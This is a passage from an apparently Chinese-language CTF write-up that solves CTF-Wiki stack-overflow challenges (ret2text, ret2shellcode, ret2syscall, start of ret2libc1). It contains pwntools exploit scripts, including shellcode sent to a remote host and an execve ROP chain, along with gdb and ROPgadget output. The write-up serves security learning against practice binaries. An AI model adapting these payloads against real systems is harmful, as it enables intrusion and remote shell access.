REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────</span><br><span class="line">*EAX  0xffffcf1c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* <span class="string">&#x27;,=&quot;&#x27;</span> */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffcf88 ◂— 0</span><br><span class="line"> ESP  0xffffcf00 —▸ 0xffffcf1c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x80486b3 (main+107) ◂— mov dword ptr [esp], 0x80487a4</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]─────────────────────────────────────────────────────────────</span><br><span class="line">  ......</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────</span><br><span class="line">......</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────── </span><br><span class="line">......</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p>这里只写一些重要的操作和一些重要输出，输出中重点内容是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*EAX  0xffffcf1c ◂— &#x27;hello&#x27;</span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffcf88 ◂— 0</span><br><span class="line"> ESP  0xffffcf00 —▸ 0xffffcf1c ◂— &#x27;hello&#x27;</span><br><span class="line">*EIP  0x80486b3 (main+107) ◂— mov dword ptr [esp], 0x80487a4</span><br></pre></td></tr></table></figure>
<p>EBP和ESP的地址间隔是<code>0xffffcf88 - 0xffffcf1c</code>&#x3D; <code>4294954888 - 4294954780</code> &#x3D; 108(这里可以直接用<code>88h-1ch</code>初学为了好理解就写全了)，拿到间隔长度之后需要+4，因为要往返回地址中写内容，而返回地址的位置是再esp 的上面所以需要+4。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">============================</span><br><span class="line">			返回地址</span><br><span class="line">============================</span><br><span class="line">			%esp</span><br><span class="line">============================</span><br><span class="line">			xxxxx</span><br><span class="line">============================</span><br></pre></td></tr></table></figure>
<h3 id="代码攻击"><a href="#代码攻击" class="headerlink" title="代码攻击"></a>代码攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">108</span> + <span class="number">4</span>) + p32(target)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
<p>效果展示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ python test.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 35232</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> !$ <span class="built_in">ls</span></span><br><span class="line">core  ret2text    run  test.py</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/kali/Desktop/pwn</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./ret2text&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 35232)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>

<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="题目来源-1"><a href="#题目来源-1" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a><br>PS：内容来自于CTF-WIKI</p>
<h3 id="关于环境"><a href="#关于环境" class="headerlink" title="关于环境"></a>关于环境</h3><p>高版本的linux内核似乎已经修复了这个问题，目前只能尝试在<code>Ubuntu-18.04</code>或之前的版本可以 内核版本目前我用的是<code>5.4.0-84-generic</code>成功复现了这个题目。</p>
<h3 id="文件类型-1"><a href="#文件类型-1" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file ret2shellcode</span><br><span class="line">ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ checksec --file=ret2shellcode</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br></pre></td></tr></table></figure>
<p>NX是关闭的，这一题考点就和这个有关系。</p>
<h3 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main中有大问题，<code>gets</code>就不说了，攻击点就肯定是在这里，然后他往一个s[100]输入值了之后把s的值全部放到了buf2中，这个buf2在main中也没有定义，去看一下他的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804</span>A080                               public buf2</span><br><span class="line">.bss:<span class="number">0804</span>A080                               ; <span class="type">char</span> buf2[<span class="number">100</span>]</span><br><span class="line">.bss:<span class="number">0804</span>A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db <span class="number">64</span>h <span class="title function_">dup</span><span class="params">(?)</span>                      ; DATA XREF: main+<span class="number">7B</span>↑o</span><br><span class="line">.bss:<span class="number">0804</span>A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends</span><br><span class="line">.bss:<span class="number">0804</span>A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+</span><br></pre></td></tr></table></figure>
<p>他的地址是<code>0x0804A080</code>这里还是在bss段中的，这里的值是可以读写的。这里思路已经清晰了。</p>
<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>这里面没有发现什么后门，这里我们就需要自己制造出一个后门sh,通过把后门sh写入到buf2中，然后用栈溢出把返回地址修改成buf2就可以完成攻击。</p>
<h3 id="溢出长度-1"><a href="#溢出长度-1" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">hello      </span><br><span class="line">15	<span class="keyword">in</span> ret2shellcode.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0xffffd29c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* <span class="string">&#x27;,=&quot;&#x27;</span> */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd308 ◂— 0</span><br><span class="line"> ESP  0xffffd280 —▸ 0xffffd29c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x8048598 (main+107) ◂— mov dword ptr [esp + 8], 0x64</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>esp地址是<code>0xffffd29c</code>然后ebp地址是<code>0xffffd308</code>进行计算776-668&#x3D;108,需要溢出的栈长度是108+4，然后再加上返回地址改成buf2那就是116。</p>
<h3 id="脚本攻击"><a href="#脚本攻击" class="headerlink" title="脚本攻击"></a>脚本攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">&quot;172.20.10.4&quot;</span>,<span class="number">16000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf2地址</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload构建</span></span><br><span class="line"><span class="comment"># 这里payload的总长度是116</span></span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b&quot;a&quot;</span>) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="题目来源-2"><a href="#题目来源-2" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a><br>PS：内容来自于CTF-WIKI</p>
<h3 id="文件类型-2"><a href="#文件类型-2" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file rop    </span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>32位ELF文件</p>
<h3 id="软件防护"><a href="#软件防护" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ checksec --file=rop  </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2255 Symbols      No    0               0               rop</span><br></pre></td></tr></table></figure>
<p>栈溢出防护是关闭的，NX是开启的，那这道题基本上就是用ROP进行栈溢出了。</p>
<h3 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说这次没有<code>system()</code>和<code>shellcode</code>该怎么办，但是这里有<code>gets</code>函数肯定存在栈溢出，然后分析了一下，确实是没有<code>system()</code>，shellcode也没办法执行，但是在地址<code>0x080BE408</code>发现了字符串<code>&quot;/bin/sh&quot;</code></p>
<h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>shellcode和后门函数都不存在，这里直接尝试rop。</p>
<h3 id="ROPgadget查询"><a href="#ROPgadget查询" class="headerlink" title="ROPgadget查询"></a>ROPgadget查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ ROPgadget --binary ./rop --only <span class="string">&quot;pop|ret&quot;</span>|grep eax    </span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
<p>eax_ret &#x3D; 0x080bb196</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ ROPgadget --binary ./rop --only <span class="string">&quot;pop|ret&quot;</span>|grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
<p>edx_ecx_ebx_ret &#x3D; 0x0806eb90</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ ROPgadget --binary ./rop |grep <span class="string">&quot;int&quot;</span>|grep <span class="string">&quot;0x80&quot;</span></span><br><span class="line">...</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>intx80 &#x3D; 0x08049421</p>
<h3 id="溢出长度-2"><a href="#溢出长度-2" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*EAX  0xffffcf7c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0x80481a8 (_init) ◂— push ebx</span><br><span class="line">*ECX  0xfbad2288</span><br><span class="line">*EDX  0x80eb4e0 (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]</span><br><span class="line"> ESI  0</span><br><span class="line"> EBP  0xffffcfe8 —▸ 0x8049630 (__libc_csu_fini) ◂— push ebx</span><br><span class="line"> ESP  0xffffcf60 —▸ 0xffffcf7c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x8048e9b (main+119) ◂— mov eax, 0</span><br></pre></td></tr></table></figure>
<p>0xe8-0x7c&#x3D;232-124&#x3D;108+4&#x3D;112</p>
<h3 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x080BE408</span></span><br><span class="line">eax_ret = <span class="number">0x080BB196</span></span><br><span class="line">edx_ecx_ebx_ret = <span class="number">0x0806EB90</span></span><br><span class="line">intx80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        eax_ret,</span><br><span class="line">        <span class="number">0xB</span>,</span><br><span class="line">        edx_ecx_ebx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        sh,</span><br><span class="line">        intx80,</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面四个地址分别是“&#x2F;bin&#x2F;sh”字符串地址、<code>pop eax ret</code>地址、<code>pop ebx ecx edx ret</code>地址、<code>int 0x80</code>地址，使用上面的payload可以达成下面执行效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx, [&quot;/bin/sh&quot;]</span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
<p>payload中的<code>0xb</code>是系统调用的id他代表执行命令的一个函数。</p>
<h2 id="plt与got"><a href="#plt与got" class="headerlink" title="plt与got"></a>plt与got</h2><p>在编译程序的时候一般都是采用动态链接库的方式去编译，有些函数都是直接调用系统本地的libc，不把这些通用的函数编译进程序中，在采用动态链接库的程序里，如果是需要调用链接库的函数都会在plt和got表中存在一个条数据，plt会指向got表，got最终指向真正在系统中的函数地址，程序在最开始的时候plt和got是有连接的，但是如果函数一次都没被调用那么got表将会是空的，在第一次调用的时候got表才会真正指向内存中的对应函数地址，所以在ROP构造的时候对于这种采用动态链接库的程序可以通过调用对应函数的plt或者调用got地址存储的对应地址来执行相应的函数。需要注意的是动态链接库都是通过系统加载的，真正的函数地址肯定是不固定的，每次启动都会有不同的偏移，想要利用需要知道对应的函数偏移，在一个静态的glibc文件，里面的函数布局除了在加载的偏移不同之外其他的只要版本相同其他都是相同的。</p>
<h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><h3 id="题目来源-3"><a href="#题目来源-3" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1</a><br>PS：内容来自于CTF-WIKI</p>
<h3 id="文件类型-3"><a href="#文件类型-3" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file ret2libc1     </span><br><span class="line">ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>这是一个采用动态连接库编译的32位ELF文件</p>
<h3 id="软件防护-1"><a href="#软件防护-1" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> checksec --file=ret2libc1    </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols        No    0               1               ret2libc1</span><br></pre></td></tr></table></figure>
<p>允许栈溢出，NX防护开启，PIE防护关闭。</p>
<h3 id="IDA分析-3"><a href="#IDA分析-3" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>在main函数中内容如下</p>
